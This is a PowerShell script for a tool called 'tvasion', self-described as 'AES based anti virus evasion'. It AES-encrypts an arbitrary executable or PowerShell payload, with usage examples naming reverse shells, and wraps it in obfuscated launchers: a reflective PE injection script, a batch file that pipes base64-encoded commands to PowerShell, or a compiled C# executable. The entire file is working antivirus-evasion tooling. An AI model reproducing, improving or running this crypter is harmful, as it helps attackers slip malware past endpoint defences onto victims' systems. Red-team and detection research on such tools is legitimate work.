#!/usr/bin/env pwsh

# params -t (exe|bat|ps1) "type", -d "debug", "payload"
param(
    [parameter()]$payload,
    [parameter()][String]$t,
    [parameter()][String]$o,
    [switch]$d
);

# usage output
function usage() {
    write-output 'tvasion: AES based anti virus evasion';
    write-output 'type parameter -t (exe|bat|ps1), argument "payload path" are required, -o "output directory" is optional, -d "debug" is optional';
    write-output './tvasion -t (exe|bat|ps1) [PAYLOAD (exe|ps1)] OR ./tvasion [PAYLOAD (exe|ps1)] -t (exe|bat|ps1)';
    write-output 'Parameter:';
    write-output '[PAYLOAD (exe|ps1)]       input file path. requires: exe, ps1         required';
    write-output '-t (exe|ps1|bat)          output file type: exe, ps1, bat             required';
    write-output '-o (PATH)                 set output directory (default is ./out/)    optional';
    write-output '-d                        generate debug output                       optional';
    write-output 'examples:';
    write-output "./tvasion.ps1 -t exe tests/ReverseShell.ps1           # generate windows executable (.exe) from powershell";
    write-output './tvasion.ps1 -t ps1 tests/ReverseShell_c#amd64.exe   # generate powershell (.ps1) from excecutable';
    write-output './tvasion.ps1 -t exe tests/ReverseShell_c#amd64.exe   # generate windows executable (.exe) from excecutable';
}

# get current script path
function getScriptDirectory {
    $scriptInvocation = (Get-Variable MyInvocation -Scope 1).Value
    return Split-Path $scriptInvocation.MyCommand.Path
}
$__rootPath = getScriptDirectory;
$__workPath = Get-Location;

# aes encrypt payload, put in template from path and return template with payload included in string
function pasteInTemplate_AESBASE64($payload, $templatePath) {

    # generate random hex for aes key, iv
    $random_aesIv = -join ((48..57) + (97..102)  | Get-Random -Count 16 | % {[char]$_});
    $random_aesKey = "";
    for ($i = 0; $i -le 31; $i++) {
        $random_aesKey += -join ((48..57) + (97..101) | Get-Random -Count 1 | % {[char]$_}); 
    }
    
    # encrypt payload
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged";
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC;
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; 
    $aesManaged.BlockSize = 128;
    $aesManaged.KeySize = 128;
    $aesManaged.IV = [System.Text.Encoding]::UTF8.GetBytes($random_aesIv);
    $aesManaged.Key = [System.Text.Encoding]::UTF8.GetBytes($random_aesKey);
    $encryptor = $aesManaged.CreateEncryptor();
    $encryptedData = $encryptor.TransformFinalBlock($payload, 0, $payload.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData;
    $aesManaged.Dispose();
    $encryptedString = [System.Convert]::ToBase64String($fullData);
    $template = Get-Content -Raw "$($__rootPath)/templates/$templatePath"; # TODO check this

    # replace aes key in template, regex matches key = "[BASE64]"
    $variable_key = Select-String '(?:key = "|\[\])((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))' -input $template;    
    if ($variable_key.matches.length -gt 0 -and $variable_key.matches.groups.length -gt 0) {
        $template = $template -replace [regex]::escape($variable_key.matches.groups[1].Value), $random_aesKey
    } else {
        write-output "tvasion: regular expression for key = `"[BASE64]`" does not match in template: $templatePath";
        exit 1;
    }
    
    # replace aes encrypted payload in template, regex matches $encryptedStringWithIV="[BASE64]"
    $variable_encryptedStringWithIV = Select-String '(?:encryptedStringWithIV = "|\[\])((?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{4}))' -input $template;
    if ($variable_encryptedStringWithIV.matches.length -gt 0 -and $variable_encryptedStringWithIV.matches.groups.length -gt 0) {
         $template = $template -replace [regex]::escape($variable_encryptedStringWithIV.matches.groups[1].Value), $encryptedString
    } else {
        write-output "tvasion: regular expression for encryptedStringWithIV = `"[BASE64]`" does not match in template: $templatePath";
        exit 1;
    }    
    return $template;
}

# read payload from path if argument contains path
if ($payload -match "/.+/|^.+\.[A-z0-9]{2,3}$") {

    # test file exists
    if (![System.IO.File]::Exists($payload)) {
        write-output 'tvasion: payload file do not exist';
        usage;
        exit 1;
    }

    # get bytes if .exe path ending
    if ([System.IO.Path]::GetExtension($payload) -eq ".exe") {
        $payload = [System.IO.File]::ReadAllBytes($payload);

    # get script / text file
    } else {
        $payload = Get-Content -Raw $payload;
    }
} else {
    write-output "tvasion: file not available. Notice: no pipes supported at the moment";
}

# check payload type
# bin / hex payload (.exe)
if ($payload -match "^[a-f0-9]+$") {
    
    # TODO maybe check MZ header to be sure it's executable: ~ $payload[0..4] --> M Z = 4D 5A = 77 90
    
    # hex string to byte
    #$return = @();
    #for ($i = 0; $i -lt $payload.Length ; $i += 2) {
    #    $return += [Byte]::Parse($payload.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
    #}
    #$payload = $return;
    
    $type = "raw";
    
# powershell payload (.ps1)
} elseif ($payload -match "[\$A-z0-9]+") {
    $type = "ps1";  

# unknown payload type
} else {
    write-output 'tvasion: invalid payload type (exe|hex|ps1)';
    usage;
    exit 1;
}

# possible output types
$outputTypes = "exe","bat","ps1";
$t = $t.ToLower();

# validate type (-t)
if (!$outputTypes.contains($t)) {
    write-output 'tvasion: invalid output type (-t)';
    usage;
    exit 1;
}

# set output dir (-o)
if ($o -match "/.+/|^.+$") {
    if (!(test-path $o)) {
        New-Item -ItemType Directory -Force -Path $o | Out-Null;
    }
    $outDir = $o;
} else {
    $outDir =  "$($__rootPath)/out";
}

# generate random unique filename
$filename = "";
do {
    for ($i = 1; $i -le(Get-Random -Minimum 8 -Maximum 16); $i++) {
        $filename += -join ((48..57) + (97..101) | Get-Random -Count 1 | % {[char]$_}); 
    }
} while (Test-Path($outDir + "/" + $filename))

# Powershell script (.ps1) -t ps1 
if ($t -eq "ps1") {

    # binary input, default_exe.ps1 template
    if ($type -eq "raw") {
    
        # add ReflectivePEInjection function to payload   
        $reflectivedllinjectionBytes = [System.IO.File]::ReadAllBytes($__rootPath + "/templates/lib/Invoke-ReflectivePEInjection.ps1");
        $payload = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $payload;    
        $template = pasteInTemplate_AESBASE64 $payload "default_exe.ps1";        
        
    # powershell input, default.ps1 template
    } else {
        $payload = [System.Text.Encoding]::UTF8.GetBytes($payload);
        $template = pasteInTemplate_AESBASE64 $payload "default.ps1"
    }
    $template > "$($outDir)/$($filename).$($t)";

# batch file with base64 encoded Powershell launcher (.bat) -t bat
} elseif ($t -eq "bat") {
        
    # binary input, default_exe.ps1 template
    if ($type -eq "raw") {
    
        # add ReflectivePEInjection function to payload   
        $reflectivedllinjectionBytes = [System.IO.File]::ReadAllBytes($__rootPath + "/templates/lib/Invoke-ReflectivePEInjection.ps1");
        $payload = [bitconverter]::GetBytes($reflectivedllinjectionBytes.length) + $reflectivedllinjectionBytes + $payload;       
        $template = pasteInTemplate_AESBASE64 $payload "default_exe.ps1";
        
    # powershell input, default.ps1 template
    } else {
        $payload = [System.Text.Encoding]::UTF8.GetBytes($payload);
        $template = pasteInTemplate_AESBASE64 $payload "default.ps1"
    }
    
    $template = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($template));    
    "echo $template | PowerShell.exe -Enc -" | out-file -encoding ASCII "$($outDir)/$($filename).$($t)";

# Windows executable payload compiled into C# (.exe) launcher -t exe
} elseif ($t -eq "exe") { 

    # check if compiler is available
    if ((Get-Command "mcs" -ErrorAction SilentlyContinue) -eq $null) { 
        write-output "tvasion: compiler "mcs" not available, required for this action";
        write-output "tvasion: try: apt-get install -y mono-mcs";
        exit 1;
    }

    # default_exe.cs template
     if ($type -eq "raw") {     
        $template = pasteInTemplate_AESBASE64 $payload "default_exe.cs";
    
    # default.cs template
    } else {     
        $payload = [System.Text.Encoding]::Unicode.GetBytes($payload);
        $template = pasteInTemplate_AESBASE64 $payload "default.cs";        
     }
     
    # create temp file for compiler and debug & compile          
    if ($d) {
        $tmpFileMono = "$($outDir)/$($filename)_DEBUG.cs";
    } else {
        $tmpFileMono = [System.IO.Path]::GetTempFileName(); 
    }  
    $template > $tmpFileMono 
    #mcs $tmpFileMono -platform:x86 -unsafe -out:"$($outDir)/$($filename).$($t)"# input is available via file only, no stdin pipe
    mcs $tmpFileMono -platform:x64 -unsafe -out:"$($outDir)/$($filename).$($t)" 
    if (!$d) {
        Remove-Item –Path "$tmpFileMono";
    }

}  
write-output "tvasion: payload written to file: out/$filename.$t";

